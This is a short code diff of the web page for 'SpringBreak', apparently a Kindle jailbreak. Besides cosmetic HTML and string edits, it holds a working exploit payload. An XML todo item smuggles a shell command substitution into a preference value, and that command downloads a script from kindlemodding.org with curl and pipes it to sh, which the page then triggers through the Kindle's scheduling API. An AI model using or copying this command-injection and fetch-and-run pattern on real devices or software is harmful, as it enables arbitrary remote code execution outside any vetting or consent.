@@ -48,8 +48,8 @@
 
     <div class="outer">
         <div class="inner">
-            <h1>SpringBreak</h1><br><br>
-            <p><i>If we had no winter, the spring would not be so pleasant.<br>- Anne Bradstreet</i></p>
+            <h1>SpringBreak</h1><br>
+            <p><i>If we had no winter, the spring<br> would not be so pleasant.<br>- Anne Bradstreet</i></p>
         </div>
     </div>
 
@@ -74,10 +74,12 @@
 
             window.kindle.messaging.sendMessage("com.lab126.chromebar", "configureChrome", chromebar);
         };
+
+        update();
         window.kindle.appmgr.ongo = function () { update(); };
 
         //Logic
-        var info = "SpringBreak Jailbreak\nBy Penguins184, H^9\nThanks To Scam.net, Hackerdude\nhttps://ko-fi.com/penguins186";
+        var info = "SpringBreak Jailbreak\\nBy Penguins184, H^9\\nThanks To Scam.net, Hackerdude\\nhttps://ko-fi.com/penguins186";
         var payload = '<?xml version="1.0" encoding="UTF-8"?><response><total_count>1</total_count><items><item priority="1" type="SCFG" action="SET" key="DUMMY" is_incremental="false" sequence="0">winmgr.vibrancyMode.pref.path=$(JB_INFO="' + info + '"; curl -L kindlemodding.org/jb.sh | sh) #</item></items></response>';
         window.kindle.todo.scheduleItems(payload); //Set Payload (Next Step Causes Trigger)
         
